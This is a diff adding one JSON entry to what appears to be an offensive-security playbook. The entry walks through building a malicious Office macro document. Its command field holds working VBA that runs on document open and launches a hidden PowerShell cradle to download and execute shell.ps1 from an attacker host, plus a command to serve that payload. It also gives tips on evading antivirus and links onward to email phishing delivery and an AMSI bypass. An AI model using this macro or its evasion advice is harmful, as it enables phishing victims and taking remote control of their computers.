@@ -1,0 +1,26 @@
+{
+  "id": "client_side_macro",
+  "phase": "SHELL",
+  "title": "Client-Side \u2014 Office Macro (VBA)",
+  "body": "Classic macro doc. Requires Office installed AND the user to enable macros, so it's less reliable than the library chain \u2014 but strong when you know the target uses Office. Save as .doc (legacy), not .docx \u2014 .docx can't store macros.",
+  "cmd": "# In the VBA editor (Alt+F11) > Insert > Module:\nSub AutoOpen()\n  Shell \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\"\nEnd Sub\nSub Document_Open()\n  AutoOpen\nEnd Sub\n#   AutoOpen + Document_Open = fires on open. Save as Word 97-2003 .doc.\n\n# Serve the cradle target:\npython3 -m http.server 80   # hosting shell.ps1",
+  "warn": "Save as .doc not .docx (docx is macro-incapable). For AV evasion, split the payload string into a char array / concatenated chunks rather than one plaintext command.",
+  "choices": [
+    {
+      "label": "Deliver by email (swaks)",
+      "next": "client_side_phish_email"
+    },
+    {
+      "label": "Got shell \u2014 upgrade",
+      "next": "shell_upgrade"
+    },
+    {
+      "label": "AV killed it",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "Back to client-side options",
+      "next": "client_side"
+    }
+  ]
+}
